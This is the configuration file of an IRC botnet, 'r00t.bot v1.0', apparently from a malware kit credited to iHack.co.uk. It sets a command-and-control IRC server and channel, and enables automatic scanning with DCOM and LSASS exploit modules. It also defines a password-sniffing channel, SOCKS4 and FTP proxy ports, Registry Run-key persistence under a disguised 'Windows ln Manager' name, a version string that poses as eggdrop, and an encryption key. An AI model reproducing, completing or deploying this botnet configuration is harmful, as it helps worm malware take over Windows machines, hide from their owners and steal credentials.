/*

        _______  _______   __    ___.           __   
_______ \   _  \ \   _  \_/  |_  \_ |__   _____/  |_ 
\_  __ \/  /_\  \/  /_\  \   __\  | __ \ /  _ \   __\
 |  | \/\  \_/   \  \_/   \  |    | \_\ (  <_> )  |  
 |__|    \_____  /\_____  /__|   /\___  /\____/|__|  
               \/ Affix \/       \/   \/ iHack.co.uk
			   
				 r00t.bot v1.0
				 ASN - Affix
				 SkySyn - Affix
				 Connection(recode) - Affix
				 Shellcode - h1dd3n
				 ftpd - Affix

*/

int port = 8067;			
int port2 = 1866;				
int tftpport = 6900;
int socks4port = 2020;				
BOOL topiccmd = TRUE;			
BOOL rndfilename = FALSE;		
BOOL AutoStart = TRUE;			
char prefix = '.';				
int maxrand = 8;				
int nicktype = LETTERNICK;		
BOOL nickprefix = FALSE;			

#ifdef DEBUG_LOGGING
char logfile[]="c:\\WINDOWS\\SYSTEM32\\hscofng.ocx";
#endif

#ifndef NO_CRYPT 

#else  

SCANALL scanall[]={
{"dcom135", true},
{"lsass_445", true},
{"asn445", true},
{NULL, false}
};
char lsaip[] = "192.168.0.1";                  
char lsaport[] = "3677";			
char lsuser[] = "cyber";
char lspass[] = "terror";

int ftpport = 5898;


char botid[] = "ihackcouk";						
char version[] = "][r00t.bot][Affix][";		
char password[] = "";		
char server[] = "irc.z-factor.cn";	
char serverpass[] = "";		
char channel[] = "#r00t";		
char chanpass[] = "";						
char server2[] = "";						
char channel2[] = "";						
char chanpass2[] = "";						
char filename[] = "lnhost.exe";			
char valuename[] = "Windows ln Manager";		
char nickconst[] = "hd|";					
char szLocalPayloadFile[]="encrtpy.xml";	
char modeonconn[] = "-x+i";					
char exploitchan[] = "#r00t";					
char psniffchan[] = "#r00t";						

char *authost[] = {
	"*@*.iHack.co.uk"
};

char *versionlist[] = {
"eggdrop v1.6.20",
"eggdrop v1.6.17",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "2pckiws19f3bw3e0"; 
#endif
